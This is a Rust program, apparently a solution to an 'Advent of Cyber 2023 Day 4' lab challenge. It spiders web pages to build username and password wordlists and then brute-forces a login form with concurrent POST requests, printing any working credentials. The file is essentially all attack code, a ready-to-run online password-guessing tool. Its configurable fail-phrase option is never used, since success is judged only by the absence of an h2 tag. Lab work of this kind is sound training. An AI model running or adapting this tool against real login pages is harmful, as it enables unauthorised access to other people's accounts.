extern crate argparse;

use std::collections::{HashMap, HashSet};

use argparse::{ArgumentParser, Store};
use futures::{stream, StreamExt};
use itertools::Itertools;
use regex::Regex;
use reqwest::{Client, Error, Response};
use soup::prelude::*;

const CONCURRENT_REQUESTS: usize = 5;

struct Config {
    client: Client,
    fail_phrase: String,
    login_url: String,
    pw_start_url: String,
    pw_depth: u8,
    pw_min_length: usize,
    uname_start_url: String,
    uname_depth: u8,
    uname_min_length: usize,
}

struct CredentialPair {
    username: String,
    password: String,
}

struct BruteResult {
    combination: String,
    success: bool,
}

impl From<String> for CredentialPair {
    fn from(cred_string: String) -> Self {
        let mut split_iter = cred_string.split(':').map(|part| part.to_string());
        let username: String = split_iter.next().unwrap();
        let password: String = split_iter.next().unwrap();
        CredentialPair { username, password }
    }
}

impl Default for Config {
    fn default() -> Self {
        Config {
            client: Client::builder().cookie_store(true).build().unwrap(),
            fail_phrase: "Please enter the correct credentials".to_string(),
            login_url: Default::default(),
            pw_start_url: Default::default(),
            pw_depth: 2,
            pw_min_length: 5,
            uname_start_url: Default::default(),
            uname_depth: 0,
            uname_min_length: 5,
        }
    }
}

async fn spider_passwords(config: &Config) -> Result<HashSet<String>, Error> {
    let mut visited: HashMap<String, bool> = HashMap::new();
    let mut endpoint_search: Vec<String> = Vec::new();
    endpoint_search.push("".to_string());
    visited.insert("".to_string(), false);

    let mut wordlist: HashSet<String> = HashSet::new();

    let no_symbols = Regex::new(r"[^A-Za-z0-9]").unwrap();

    let mut depth: u8 = 0;

    while !endpoint_search.is_empty() {
        let endpoint = endpoint_search.pop().unwrap();
        if let Some(false) = visited.get(&endpoint) {
            depth += 1;
            visited
                .entry(endpoint.clone())
                .and_modify(|visited| *visited = true);
            let formatted_url = format!(
                "{base_url}/{endpoint}",
                base_url = config.pw_start_url,
                endpoint = endpoint
            );
            let res: Response = config.client.get(formatted_url).send().await?;
            let soup: Soup = Soup::new(&*res.text().await.unwrap());

            soup.text()
                .split_ascii_whitespace()
                .map(|word| no_symbols.replace_all(word, "").to_string())
                .filter(|word| word.len() >= config.pw_min_length)
                .for_each(|word| {
                    wordlist.insert(word);
                });

            if depth >= config.pw_depth {
                depth -= 1;
                continue;
            }

            let mut links = soup
                .tag("a")
                .find_all()
                .map(|tag| tag.attrs()["href"].clone())
                .filter(|x| !x.is_empty())
                .unique()
                .collect::<Vec<_>>();

            links.iter().for_each(|link| {
                visited.insert(link.clone(), false);
            });

            endpoint_search.append(&mut links);
        }
    }
    Ok(wordlist)
}

async fn spider_usernames(config: &Config) -> Result<HashSet<String>, Error> {
    let mut wordlist: HashSet<String> = HashSet::new();

    let all_letters = Regex::new(r"[^A-Za-z]").unwrap();

    let res: Response = config.client.get(&config.uname_start_url).send().await?;
    let soup: Soup = Soup::new(&*res.text().await.unwrap());

    soup.text()
        .split_ascii_whitespace()
        .map(|word| all_letters.replace_all(word, "").to_string())
        .map(|word| word.to_lowercase())
        .filter(|word| word.len() >= config.uname_min_length)
        .for_each(|word| {
            wordlist.insert(word);
        });
    Ok(wordlist)
}

fn determine_result(combination: &String, response_text: &String) -> Result<BruteResult, Error> {
    let soup = Soup::new(&response_text);
    match soup.tag("h2").find() {
        Some(_) => Ok::<BruteResult, Error>(BruteResult {
            combination: combination.clone(),
            success: false,
        }),
        None => Ok::<BruteResult, Error>(BruteResult {
            combination: combination.clone(),
            success: true,
        }),
    }
}

async fn brute_force(
    config: &Config,
    usernames: &HashSet<String>,
    passwords: &HashSet<String>,
) -> Result<Option<String>, Error> {
    let combinations: Vec<String> = usernames
        .iter()
        .cartesian_product(passwords)
        .map(|credential_pair: (&String, &String)| {
            format!(
                "{username}:{password}",
                username = credential_pair.0,
                password = credential_pair.1
            )
        })
        .collect::<Vec<_>>();
    let mut brute_results = stream::iter(&combinations)
        .map(|combination: &String| async move {
            let credentials = CredentialPair::from(combination.clone());
            let mut params: HashMap<&str, &str> = HashMap::new();
            params.insert("username", &credentials.username);
            params.insert("password", &credentials.password);
            let resp: Response = config
                .client
                .post(&config.login_url)
                .form(&params)
                .send()
                .await?;
            let response_text = resp.text().await?;
            determine_result(combination, &response_text)
        })
        .buffer_unordered(CONCURRENT_REQUESTS);

        loop {
            match brute_results.next().await {
                Some(Ok(result)) => {
                    if result.success {
                        println!("Credentials Found: {}", result.combination);
                        return Ok(Some(result.combination));
                    } else {
                        println!("ACCESS DENIED: {}", result.combination);
                    }
                }
                Some(Err(err)) => {
                    println!("Error encountered: {:?}", err);
                    return Err(err);
                }
                None => {
                    println!("End of combinations.");
                    return Ok(None);
                }
            }
        }

    
}

#[tokio::main]
async fn main() -> Result<(), reqwest::Error> {
    let mut config = Config::default();

    {
        let mut ap: ArgumentParser<'_> = ArgumentParser::new();
        ap.set_description("Rusty AoC 2023 Day 4: Wordlist Bruteforce");
        ap.refer(&mut config.pw_start_url)
            .add_argument("pw_url", Store, "The URL to start looking for passwords")
            .required();
        ap.refer(&mut config.uname_start_url)
            .add_argument("uname_url", Store, "The URL to start looking for usernames")
            .required();
        ap.refer(&mut config.login_url)
            .add_argument("login_url", Store, "The login URL to brute force")
            .required();
        ap.refer(&mut config.fail_phrase).add_option(
            &["-f", "--fail-phrase"],
            Store,
            "A string of text indicating login failure",
        );
        ap.parse_args_or_exit();
    }

    let passwords: HashSet<String> = spider_passwords(&config).await?;
    let usernames: HashSet<String> = spider_usernames(&config).await?;

    brute_force(&config, &usernames, &passwords).await?;
    Ok(())
}
